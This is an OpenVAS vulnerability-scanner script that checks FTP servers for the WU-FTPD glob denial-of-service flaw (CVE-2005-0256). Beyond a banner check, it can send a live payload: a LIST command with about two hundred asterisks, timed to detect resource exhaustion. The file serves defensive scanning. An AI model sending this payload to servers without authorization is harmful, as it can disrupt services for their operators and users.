# OpenVAS Vulnerability Test
# $Id: wu_ftpd_glob2.nasl 6056 2017-05-02 09:02:50Z teissa $
# Description: FTPD glob (too many *) denial of service
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "WU-FTPD exhausts all available resources on the server
when it receives several times
LIST *****[...]*.*";

tag_solution = "Contact your vendor for a fix";

# References:
# http://www.idefense.com/application/poi/display?id=207&type=vulnerabilities

if (description)
{
 	script_id(17602);
 	script_version("$Revision: 6056 $");
 	script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
 	script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
	script_cve_id("CVE-2005-0256");
    script_tag(name:"cvss_base", value:"5.0");
    script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"qod_type", value:"remote_banner_unreliable");
 	name = "FTPD glob (too many *) denial of service";
	script_name( name);



 	script_category(ACT_DENIAL);
 	script_family( "FTP");

 	script_copyright("Copyright (C) 2005 Michel Arboi");
 	script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl");
 	script_require_ports("Services/ftp", 21);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
 	exit(0);
}


include('global_settings.inc');
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if (! port) port = 21;
if (! get_port_state(port)) exit(0);

banner = get_ftp_banner(port: port);

if (safe_checks())
{
 if (egrep(string:banner, pattern:" FTP .*Version wu-2\.6\.(1|2|2\(1\)) ")) security_message(port);
 exit(0);
}

if (!banner || ("Version wu-" >!< banner)) exit (0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if (! login) login = "anonymous";
if (! password) password = "openvas@example.com";

for (i = 0; i < 2; i ++)
{
 soc = open_sock_tcp(port);
 if (! soc ||
     ! ftp_authenticate(socket:soc, user:login, pass:password))
  exit(0);
 pasv = ftp_pasv(socket: soc);
 soc2 = open_sock_tcp(pasv);
 # Above 194 *, the server answers "sorry input line too long"
 if (i)
 send(socket: soc, data: 'LIST ***********************************************************************************************************************************************************************************************.*\r\n');
 else
 send(socket: soc, data: 'LIST *.*\r\n');
 t1 = unixtime();
 b = ftp_recv_line(socket:soc);
 repeat
  data = recv(socket: soc2, length: 1024);
 until (! data);
 t[i] = unixtime() - t1;
 #b = ftp_recv_line(socket:soc);
 close(soc); soc = NULL;
 close(soc2);
}

if (t[0] == 0) t[0] = 1;
if (t[1] > 3 * t[0]) security_message(port);
